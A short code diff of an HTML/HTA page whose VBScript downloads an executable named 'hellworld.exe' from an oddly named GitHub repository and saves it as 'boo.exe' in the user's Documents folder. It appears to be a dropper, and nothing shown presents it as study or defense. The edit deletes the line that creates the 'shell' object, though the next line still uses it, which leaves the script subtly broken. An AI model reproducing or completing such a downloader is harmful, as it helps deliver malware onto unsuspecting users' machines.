@@ -21,9 +21,7 @@
       Dim url, savePath
 
       url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
-      Set shell = CreateObject("WScript.Shell")
       savePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"
-
 
       On Error Resume Next
 
@@ -57,7 +55,7 @@
           MsgBox "Download failed. Status: " & http.Status, vbCritical, "Error"
       End If
 
-      self.close
+      window.close
     </script>
   </body>
 </html>
